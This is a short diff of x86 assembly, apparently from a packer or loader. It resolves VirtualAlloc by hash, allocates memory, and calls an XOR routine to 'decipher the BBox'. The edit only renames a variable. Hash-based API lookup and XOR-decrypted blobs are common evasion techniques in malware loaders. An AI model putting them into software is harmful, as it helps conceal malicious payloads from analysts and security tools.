@@ -106,7 +106,7 @@ _main:
 		invokel _getfunction, eax, HASH_VIRTUALALLOC
 		mov	ebx, RAMSTRU__LEN
 		invokel eax, NULL, ebx, MEM_COMMIT, PAGE_READWRITE
-		mov	[PEBASE], eax ; Save memory location
+		mov	[RAMSTRU], eax ; Save memory location
 
     ; Decipher the BBox 
     call _bbdxor
